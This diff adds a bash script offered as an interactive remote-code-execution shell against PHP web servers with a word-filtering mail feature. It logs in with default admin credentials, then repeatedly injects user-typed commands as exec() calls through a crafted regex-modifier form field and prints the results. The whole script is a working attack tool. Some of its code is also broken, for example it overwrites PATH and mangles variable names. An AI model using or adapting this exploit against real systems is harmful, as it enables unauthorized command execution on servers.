@@ -1,0 +1,28 @@
+#!/bin/bash
+#a very crude version of a CLI based on an RCE exploit for web server that has mailing features with profanity filters and or replaces words.
+#can make the server run code with filtred word by chaning pre-bit to an error and use code to exploit it
+HOST=$1 #www.example.com
+PATH=$2 #http://www.example.com/path/admin/ #this path should redirect to a login.php
+USERNAME="admin" #change me
+PASSWORD="password" #change me
+
+echo -en "Creating PHP key...\033[0K\r"
+PHP="PHPSESSID=1"
+sleep 2
+echo -en "Authorizing PHP key...\033[0K\r"
+sleep 1
+curl -s -L --compressed -i -s -k -X 'POST' -H "Host: $HOST" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H "Referer: $PATHlogin.php" -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: close' -H "Cookie: $PHP" -H 'Upgrade-Insecure-Requests: 1' -b "$PHP" --data-binary "username=$USERNAME&password=$PASSWORD" "$PATHdologin.php" > /dev/null
+echo -en "Creating RCE Exploit...\033[0K\r"
+sleep 3
+echo "Running RCE Exploit. (Note: one line only, use | wc -l to get count and | head -n or | tail -n)"
+while :
+do
+read -e -p "Enter Command: " cmd0
+cmd1=$(echo $cmd0 | sed 's/ /+/g')
+cmd2=$(echo "'$cmd1'")
+curl --compressed -i -s -k -X 'POST' -H "Host: $HOST" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H "Referer: $PATH/dashboard.php" -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 285' -H $'Connection: close' -H "Cookie: $PHP" -H $'Upgrade-Insecure-Requests: 1' -b "$PHP" --data-binary "sploitme%5B%2Fage%2Fe%5D=exec($cmd2)&message=%3Cp%3Eage%3Cbr%3E%3C%2Fp%3E" "$PATHemail.php" | strings | grep "<p><b>Message</b></p>" -A 3 | tail -n1 | sed 's/<br><\/p>        <\/p>//g' | sed 's/.*<p>//g'
+done
+#todo
+#add a way to read multiple lines
+#something with | wc -l
+#and for each
